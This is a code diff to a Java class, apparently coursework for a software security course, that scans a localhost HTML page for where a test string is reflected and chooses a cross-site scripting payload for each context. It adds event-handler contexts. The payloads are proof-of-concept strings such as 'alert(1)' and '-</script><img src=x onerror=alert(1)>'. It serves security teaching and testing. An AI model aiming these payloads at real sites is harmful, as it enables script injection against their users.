@@ -23,6 +23,7 @@ import org.jsoup.select.NodeVisitor;
 
 public class Launcher {
 	static String url = "http://localhost:9615/9.html";
+	static String fileName = "/Users/kvivekanandan/Desktop/ASU/CSE_545_Software_Security/server/9.html";
 	static String input = "baz";
 	static String payload = "";
 
@@ -32,7 +33,10 @@ public class Launcher {
 	 * cases; 9 - urls
 	 */
 	static enum CONTEXT {
-		SIMPLE_HTML, HTML_ATTRIBUTE_NAME, HTML_ATTRIBUTE_VALUE_SINGLE,HTML_ATTRIBUTE_VALUE_DOUBLE,HTML_ATTRIBUTE_VALUE_NO, HTML_COMMENTS, JS_FUNC, JS_SINGLE_QUOTES, JS_DOUBLE_QUOTES, JS_SINGLE_COMMENT, JS_MULTI_COMMENT, CSS_CONTEXT, URLS
+		SIMPLE_HTML, HTML_ATTRIBUTE_NAME, HTML_ATTRIBUTE_VALUE_SINGLE, HTML_ATTRIBUTE_VALUE_DOUBLE, 
+		HTML_ATTRIBUTE_VALUE_NO, HTML_ATTRIBUTE_VALUE_EVENT_SINGLE, HTML_ATTRIBUTE_VALUE_EVENT_DOUBLE,
+		HTML_ATTRIBUTE_VALUE_EVENT_NO, HTML_COMMENTS, JS_FUNC, JS_SINGLE_QUOTES, JS_DOUBLE_QUOTES, 
+		JS_SINGLE_COMMENT, JS_MULTI_COMMENT, CSS_CONTEXT, URLS
 	};
 
 	static String urlAttributes = "";
@@ -117,51 +121,34 @@ public class Launcher {
 
 								if ((e.nodeName().equals("a") || e.nodeName().equals("base") || e.nodeName().equals("link")) && a.getKey().equals("href")) {
 									context = CONTEXT.URLS;
-								} else if ((e.nodeName().equals("script") || e.nodeName().equals("iframe") || e.nodeName().equals("frame") || e.nodeName().equals("embed")|| e.nodeName().equals("input") 
-										|| e.nodeName().equals("audio")|| e.nodeName().equals("video") || e.nodeName().equals("source")) && a.getKey().equals("src")) {
+								} else if ((e.nodeName().equals("script") || e.nodeName().equals("iframe") || e.nodeName().equals("frame") || e.nodeName().equals("embed") || e.nodeName().equals("input") || e.nodeName().equals("audio") || e.nodeName().equals("video") || e.nodeName().equals("source"))
+										&& a.getKey().equals("src")) {
 									context = CONTEXT.URLS;
 								} else if ((e.nodeName().equals("object")) && a.getKey().equals("data")) {
 									context = CONTEXT.URLS;
 								} else if ((e.nodeName().equals("form")) && a.getKey().equals("action")) {
 									context = CONTEXT.URLS;
-								} else if ((e.nodeName().equals("button")|| e.nodeName().equals("input")) && a.getKey().equals("formaction")) {
+								} else if ((e.nodeName().equals("button") || e.nodeName().equals("input")) && a.getKey().equals("formaction")) {
 									context = CONTEXT.URLS;
+								}
+								if (a.getKey().equals("onclick") || a.getKey().equals("onload")) {
+									CONTEXT valueContext = getAttributeValueContext(e.tagName(), a.getKey(), a.getValue(), fileName);
+									switch (valueContext) {
+									case HTML_ATTRIBUTE_VALUE_DOUBLE:
+										context = CONTEXT.HTML_ATTRIBUTE_VALUE_EVENT_DOUBLE;
+										break;
+									case HTML_ATTRIBUTE_VALUE_SINGLE:
+										context = CONTEXT.HTML_ATTRIBUTE_VALUE_EVENT_SINGLE;
+										break;
+									case HTML_ATTRIBUTE_VALUE_NO:
+										context = CONTEXT.HTML_ATTRIBUTE_VALUE_EVENT_NO;
+										break;
+									}
+
 								} else {
 									System.out.println("ELEMENT NODENAME:" + e.nodeName());
 									System.out.println("attribute:: " + a.getKey() + " :: value is equal to input");
-//									context = CONTEXT.HTML_ATTRIBUTE_VALUE;
-									String doc = null;
-									try {
-										doc = new Scanner(new File("/Users/kvivekanandan/Desktop/ASU/CSE_545_Software_Security/server/9.html")).useDelimiter("\\Z").next();
-									} catch (FileNotFoundException e1) {
-										e1.printStackTrace();
-									}
-									String tag = e.tagName();
-									Pattern p = Pattern.compile("<"+tag+".*(\\/> | \\/"+tag+">|>)");
-									Matcher m = p.matcher(doc);
-									while(m.find()){
-										String mat = m.group(0);
-										if(mat.contains(a.getKey()) && mat.contains(a.getValue())){
-											System.out.println(m.group(0));
-											String singleQuotes = "'" + input + "'";
-											String doubleQuotes = "\"" + input + "\"";
-											Pattern pSingleQuotes = Pattern.compile(singleQuotes);
-											Pattern pDoubleQuotes = Pattern.compile(doubleQuotes);
-											Matcher sm = pSingleQuotes.matcher(mat);
-											if (sm.find()) {
-												System.out.println("single quotes pattern");
-												context = CONTEXT.HTML_ATTRIBUTE_VALUE_SINGLE;
-												break;
-											}
-											Matcher dm = pDoubleQuotes.matcher(mat);
-											if (dm.find()) {
-												System.out.println("double quotes pattern");
-												context = CONTEXT.HTML_ATTRIBUTE_VALUE_DOUBLE;
-												break;
-											}
-											context = CONTEXT.HTML_ATTRIBUTE_VALUE_NO;
-										}
-									}
+									context = getAttributeValueContext(e.tagName(), a.getKey(), a.getValue(), fileName);
 								}
 
 							}
@@ -191,6 +178,15 @@ public class Launcher {
 							break;
 						case HTML_ATTRIBUTE_VALUE_NO:
 							payload = "\"\" onclick=alert(1)";
+							break;
+						case HTML_ATTRIBUTE_VALUE_EVENT_SINGLE:
+							payload = "alert(1)";
+							break;
+						case HTML_ATTRIBUTE_VALUE_EVENT_DOUBLE:
+							payload = "alert(1)";
+							break;
+						case HTML_ATTRIBUTE_VALUE_EVENT_NO:
+							payload = "alert(1)";
 							break;
 						case JS_FUNC:
 							payload = "-</script><img src=x onerror=alert(1)>";
@@ -266,5 +262,42 @@ public class Launcher {
 		} catch (IOException e) {
 			e.printStackTrace();
 		}
+	}
+
+	static CONTEXT getAttributeValueContext(String tag, String key, String value, String fileName) {
+		CONTEXT context = null;
+		String doc = null;
+		try {
+			doc = new Scanner(new File(fileName)).useDelimiter("\\Z").next();
+		} catch (FileNotFoundException e1) {
+			e1.printStackTrace();
+		}
+
+		Pattern p = Pattern.compile("<" + tag + ".*(\\/> | \\/" + tag + ">|>)");
+		Matcher m = p.matcher(doc);
+		while (m.find()) {
+			String mat = m.group(0);
+			if (mat.contains(key) && mat.contains(value)) {
+				System.out.println(m.group(0));
+				String singleQuotes = "'" + input + "'";
+				String doubleQuotes = "\"" + input + "\"";
+				Pattern pSingleQuotes = Pattern.compile(singleQuotes);
+				Pattern pDoubleQuotes = Pattern.compile(doubleQuotes);
+				Matcher sm = pSingleQuotes.matcher(mat);
+				if (sm.find()) {
+					System.out.println("single quotes pattern");
+					context = CONTEXT.HTML_ATTRIBUTE_VALUE_SINGLE;
+					break;
+				}
+				Matcher dm = pDoubleQuotes.matcher(mat);
+				if (dm.find()) {
+					System.out.println("double quotes pattern");
+					context = CONTEXT.HTML_ATTRIBUTE_VALUE_DOUBLE;
+					break;
+				}
+				context = CONTEXT.HTML_ATTRIBUTE_VALUE_NO;
+			}
+		}
+		return context;
 	}
 }
